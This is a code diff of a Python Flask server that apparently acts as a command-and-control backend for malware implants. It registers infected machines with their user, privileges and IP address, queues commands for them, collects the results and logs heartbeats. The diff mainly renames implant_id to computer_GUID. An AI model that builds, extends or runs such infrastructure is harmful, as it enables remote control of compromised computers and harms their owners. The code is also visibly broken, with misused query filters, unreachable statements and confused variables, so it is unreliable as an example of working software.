@@ -26,7 +26,7 @@ def register():
             current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
             cmp_name = request.json['computer_name']
             user_name = request.json['computer_user']
-            computer_GUID = request.json['computer_GUID']
+            implant_id = request.json['computer_GUID']
             cmp_prev = request.json['computer_privileges']
             ip = request.json['connecting_ip_address']
             #session_key = request.json["session_key"]
@@ -40,22 +40,22 @@ def register():
 
             if error is None:
                 try:
-                    implant = Implant.query.filter(implant_id=imp_id)
+                    implant = Implant.query.filter(computer_GUID=imp_id)
                     if implant:
                         implant.computer_name = cmp_name
                         implant.computer_user = user_name
                         implant.last_seen = last_seen
 
                         db.session.commit()
+                        return jsonify({"status":"good job"})
 
                         print("Implant updated")
 
                     else:
                         implant = Implant(
-                            implant_id=imp_id,
                             computer_name=cmp_name,
                             computer_user=user_name,
-                            computer_GUID=computer_GUID,
+                            computer_GUID=implant_id,
                             computer_privileges=cmp_prev,
                             connecting_ip_address=ip,
                             # session_key=session_key,
@@ -85,7 +85,7 @@ def get_next_command():
 
             if impl_id:
                 commands = Command.query.filter(
-                    implant_id=impl_id, status="not_taken_by_implant")
+                    computer_GUID=impl_id, status="not_taken_by_implant")
                 if commands:
                     first_value = commands.first()
                     command = first_value.command_text
@@ -111,7 +111,7 @@ def store_command_results():
             result = request.json["result"]
 
             if impl_id:
-                commands = Command.query.filter(implant_id=impl_id, status="taken_by_implant",
+                commands = Command.query.filter(computer_GUID=impl_id, status="taken_by_implant",
                                                 command_id=cmd_id)
                 if commands:
                     commands.command_result = result
@@ -130,7 +130,7 @@ def heartbeat():
         try:
             imp_id = request.json['implant_id']
             try:
-                implant = Implant.query.filter(implant_id=imp_id)
+                implant = Implant.query.filter(computer_GUID=imp_id)
                 now = datetime.now()
                 current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                 implant.last_seen = current_date_time
@@ -150,7 +150,7 @@ def alert():
             try:
                 now = datetime.now()
                 current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
-                alert = Alert(implant_id=imp_id,
+                alert = Alert(computer_GUID=imp_id,
                               time_reported=current_date_time, alert=alert)
                 return jsonify({"status": "Alert Registered"})
             except:
